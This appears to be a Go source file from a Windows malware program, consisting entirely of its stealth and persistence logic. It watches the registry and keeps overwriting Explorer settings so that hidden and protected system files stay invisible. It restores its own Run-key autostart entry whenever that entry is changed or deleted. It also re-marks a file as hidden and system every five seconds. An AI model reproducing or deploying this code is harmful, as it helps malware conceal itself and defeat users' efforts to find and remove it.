package core

import (
	"golang.org/x/sys/windows/registry"
	"syscall"
	"time"
)

func WatchRegistry(regKey string, regName string) {
	var regNotifyChangeKeyValue *syscall.Proc
	changed := make(chan bool)

	if advapi32, err := syscall.LoadDLL("Advapi32.dll"); err == nil {
		if p, err := advapi32.FindProc("RegNotifyChangeKeyValue"); err == nil {
			regNotifyChangeKeyValue = p
		} else {
			//log.Fatal("Could not find function RegNotifyChangeKeyValue in Advapi32.dll")
		}
	}
	if regNotifyChangeKeyValue != nil {
		go func() {
			k, err := registry.OpenKey(registry.CURRENT_USER, regKey, syscall.KEY_NOTIFY|registry.QUERY_VALUE)
			if err != nil {
				//log.Fatal(err)
			}
			var state uint64
			for {
				regNotifyChangeKeyValue.Call(uintptr(k), 0, 0x00000001|0x00000004, 0, 0)
				val, _, err := k.GetIntegerValue(regName)
				if err != nil {
					go fixRegistry(regKey, regName, true)
				}
				if val != state {
					state = val
					changed <- val == 0
				}
			}
		}()
	}
	for {
		val := <-changed
		go fixRegistry(regKey, regName, val)
	}
}

func fixRegistry(regKey string, regName string, value bool) {
	if regName == "Hidden" {
		run("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ /v Hidden /t REG_DWORD /d 2 /f")
	} else if regName == "ShowSuperHidden" {
		run("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ /v ShowSuperHidden /t REG_DWORD /d 0 /f")
	} else if regName == SimpleStartupName {
		run("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /V " + SimpleStartupName + " /t REG_SZ /F /D " + SimpleStartupPath)
	}
}

func WatchFiles(path string) {
	for {
		state, _ := isHidden(path)
		if !state {
			run("attrib +S +H " + path)
		}
		time.Sleep(5 * time.Second)
	}
}
